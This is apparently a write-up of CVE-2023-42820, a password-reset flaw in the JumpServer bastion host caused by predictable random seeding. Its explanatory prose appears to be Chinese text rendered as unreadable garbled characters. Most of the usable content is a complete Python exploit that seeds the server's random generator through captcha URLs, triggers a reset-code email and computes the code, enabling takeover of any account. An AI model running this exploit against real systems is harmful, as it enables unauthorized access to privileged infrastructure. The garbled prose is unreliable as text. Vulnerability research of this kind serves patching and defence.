JumpServeræ˜¯ä½¿ç”¨ Python / Django è¿›è¡Œå¼€å‘ï¼Œéµå¾ª Web 2.0 è§„èŒƒçš„å…¨çƒé¦–æ¬¾å®Œå…¨å¼€æºçš„å ¡å’æœºè½¯ä»¶ã€‚å› å…¶å¼€æºï¼Œæ— æ’ä»¶ï¼ŒWebç•Œé¢ç¾è§‚ï¼Œæ“ä½œæ–¹ä¾¿ï¼Œåˆ†å¸ƒå¼ï¼Œç¬¦åˆ4Aè§„èŒƒç­‰ç‰¹ç‚¹ï¼Œè¢«å¾ˆå¤šä¼ä¸šå¹¿æ³›ç”¨äºå†…éƒ¨èµ„äº§ï¼ˆç‰©ç†æœºï¼Œäº‘ä¸»æœºç­‰ï¼‰çš„ç®¡ç†ã€‚ CVE-2023-42820é€šè¿‡å¯æ§çš„ä¼ªéšæœºæ•°æ’­ç§ï¼Œæ„é€ éšæœºæ•°è°ƒç”¨è¿‡ç¨‹ï¼Œè®¡ç®—å‡ºé‡ç½®å¯†ç åçš„éªŒè¯ç ï¼Œä»è€Œå®ç°ä»»æ„è´¦å·å¯†ç é‡ç½®ã€‚

ç”¨adminï¼šadminç›´æ¥ç™»é™†http://your-ip:8080å³å¯

å¯ä»¥çœ‹åˆ°ç”¨äº†ä¸€ä¸ªkeyï¼Œè€Œä¸”è¿˜æç¤ºäº†å…¶ä»–ç”¨è¿™ä¸ªéƒ¨åˆ†çš„åŒå­¦ä¸è¦ç”¨åŒä¸€ä¸ªkeyæ¥ç”Ÿæˆå›¾ç‰‡ã€‚ åœ¨url.pyé‡Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªkeyå°±æ˜¯è·Ÿåœ¨åé¢çš„å­—ç¬¦ä¸² è¿™ä¸ªkeyåœ¨urlé‡Œï¼Œæ˜¯å¯æ§çš„ï¼Œç±»ä¼¼è¿™æ ·ã€‚

http://10.207.139.20:8080/core/auth/captcha/image/4cbbebb2305a4ef0d0e1242c352e288073537a7d/

åœ¨ç½‘ç»œæœåŠ¡ä¸­ï¼Œæ¥æ”¶ç”¨æˆ·äº¤äº’çš„çº¿ç¨‹å¹¶ä¸å”¯ä¸€ï¼Œè€Œrandom.seed()çš„ä½œç”¨åªåœ¨å½“å‰çº¿ç¨‹ï¼Œå› æ­¤éœ€è¦å°†æˆ‘ä»¬æ§åˆ¶çš„keyä½œç”¨åœ¨æ‰€æœ‰çº¿ç¨‹ï¼Œæ‰€ä»¥expçš„ç¬¬ä¸€æ­¥ä¸ºé‡æ”¾çˆ†ç ´ï¼Œå°†æˆ‘ä»¬æ§åˆ¶çš„keyå¤§é‡å‘é€getè¯·æ±‚ï¼Œä½¿å¾—æ‰€æœ‰æœåŠ¡å™¨æ¥æ”¶çš„çº¿ç¨‹å‡è®¾ç½®random.seed()ã€‚ç„¶åé€šè¿‡apiè°ƒç”¨ï¼Œå®šä½åˆ°å¿˜è®°å¯†ç æµç¨‹ã€‚

ä½¿ç”¨form_invalidæ–¹æ³•å¯¹ç”¨æˆ·åæ˜¯å¦å­˜åœ¨è¿›è¡ŒéªŒè¯ï¼Œå¹¶é€šè¿‡random_stringæ–¹æ³•ç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º36çš„tokenï¼Œå¸¦ç€tokenè·³è½¬åˆ°forgot-passwordé¡µé¢ã€‚

å†é€šè¿‡apiå®šä½å‘é€éªŒè¯ç çš„è°ƒç”¨å‡½æ•°

ä½¿ç”¨è¯¥ç±»ä¸‹createå‡½æ•°ï¼Œé€šè¿‡random_stringæ–¹æ³•ç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º6çš„éªŒè¯ç å¹¶è¿›è¡Œå‘é€

çœ‹ä¸‹æ¥è¿™ä¸ªrandom.seed()æ˜¯ä½œç”¨äºå…¨æµç¨‹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è€ƒè™‘çš„æ˜¯

è¿”å›ä¸€å¼€å§‹åˆ†æçš„captcha_imageå‡½æ•°ï¼Œè¯¥å‡½æ•°æ§åˆ¶å›¾ç‰‡éªŒè¯ç ç”Ÿæˆï¼Œæ¸²æŸ“ï¼Œåœ¨æ¯æ¬¡çš„å¿˜è®°å¯†ç æ‰¾å›æ—¶ï¼Œå‡å…ˆè°ƒç”¨è¯¥å‡½æ•°ç”Ÿæˆå›¾ç‰‡éªŒè¯ç ï¼Œç”¨æˆ·è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’ŒéªŒè¯ç ï¼Œæ‰èƒ½è·³è½¬ä¸‹ä¸€æ­¥ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®åœ¨è¯¥å‡½æ•°éƒ¨åˆ†è°ƒç”¨äº†å‡ æ¬¡randomç±»çš„å‡½æ•°ã€‚

ä»å¤´æ¢³ç†ï¼Œåœ¨django-simple-captchaé‡Œç›´æ¥æœç´¢random,å¯ä»¥æ‰¾åˆ°

æ˜¯æ—‹è½¬å­—ç¬¦çš„ï¼Œå› ä¸ºç”Ÿæˆçš„captchaéƒ½æ˜¯4ä¸ªå­—ç¬¦ï¼ˆ8ã€*ã€3ã€=ï¼‰

æ‰€ä»¥è°ƒç”¨4æ¬¡random.randrange(),åœ¨settings.pyé‡Œä¹Ÿå¯ä»¥æ‰¾åˆ°å¯¹åº”çš„å®šä¹‰ï¼Œrangeæ˜¯ï¼ˆ-35ï¼Œ35ï¼‰

è¿˜æœ‰noisy_functionä¸­

noizy_dotä¹Ÿç”¨åˆ°äº†randomï¼Œç”¨äº† range(int(size[0]*size[1]*0.1))æ¬¡ï¼Œ åœ¨jumpserverä¸­å¯ä»¥çœ‹åˆ°capchaçš„å¤§å°æ˜¯180*38ï¼Œé‡‡ç”¨noise_dotçš„å™ªå£°ç®—æ³•

æ‰€ä»¥å¤§æ¦‚ç”¨äº†è¿™äº›random

for i in range(4):
    random.randrange(-35,35)

for j in range(int(180*38*0.1)):
    random.randint(0, 180)
    random.randint(0, 38)

äºæ˜¯å¾—åˆ°exp

import requests
import logging
import sys
import random
import string
import argparse
from urllib.parse import urljoin

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
string_punctuation = '!#$%&()*+,-.:;<=>?@[]^_~'


def random_string(length: int, lower=True, upper=True, digit=True, special_char=False):
    args_names = ['lower', 'upper', 'digit', 'special_char']
    args_values = [lower, upper, digit, special_char]
    args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation]
    args_string_map = dict(zip(args_names, args_string))
    kwargs = dict(zip(args_names, args_values))
    kwargs_keys = list(kwargs.keys())
    kwargs_values = list(kwargs.values())
    args_true_count = len([i for i in kwargs_values if i])
    assert any(kwargs_values), f'Parameters {kwargs_keys} must have at least one `True`'
    assert length >= args_true_count, f'Expected length >= {args_true_count}, bug got {length}'

    can_startswith_special_char = args_true_count == 1 and special_char

    chars = ''.join([args_string_map[k] for k, v in kwargs.items() if v])

    while True:
        password = list(random.choice(chars) for i in range(length))
        for k, v in kwargs.items():
            if v and not (set(password) & set(args_string_map[k])):
                # æ²¡æœ‰åŒ…å«æŒ‡å®šçš„å­—ç¬¦, retry
                break
        else:
            if not can_startswith_special_char and password[0] in args_string_map['special_char']:
                # é¦–ä½ä¸èƒ½ä¸ºç‰¹æ®Šå­—ç¬¦, retry
                continue
            else:
                # æ»¡è¶³è¦æ±‚ç»ˆæ­¢ while å¾ªç¯
                break

    password = ''.join(password)
    return password


def nop_random(seed: str):
    random.seed(seed)
    for i in range(4):
        random.randrange(-35, 35)

    for p in range(int(180 * 38 * 0.1)):
        random.randint(0, 180)
        random.randint(0, 38)


def fix_seed(target: str, seed: str):
    def _request(i: int, u: str):
        logging.info('send %d request to %s', i, u)
        response = requests.get(u, timeout=5)
        assert response.status_code == 200
        assert response.headers['Content-Type'] == 'image/png'

    url = urljoin(target, '/core/auth/captcha/image/' + seed + '/')
    for idx in range(30):
        _request(idx, url)


def send_code(target: str, email: str, reset_token: str):
    url = urljoin(target, "/api/v1/authentication/password/reset-code/?token=" + reset_token)
    response = requests.post(url, json={
        'email': email,
        'sms': '',
        'form_type': 'email',
    }, allow_redirects=False)
    assert response.status_code == 200
    logging.info("send code headers: %r response: %r", response.headers, response.text)


def main(target: str, email: str, seed: str, token: str):
    fix_seed(target, seed)
    nop_random(seed)
    send_code(target, email, token)
    code = random_string(6, lower=False, upper=False)
    logging.info("your code is %s", code)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('-t', '--target', type=str, required=True, help='target url')
    parser.add_argument('--email', type=str, required=True, help='account email')
    parser.add_argument('--seed', type=str, required=True, help='seed from captcha url')
    parser.add_argument('--token', type=str, required=True, help='account reset token')

    args = parser.parse_args()
    main(args.target, args.email, args.seed, args.token)
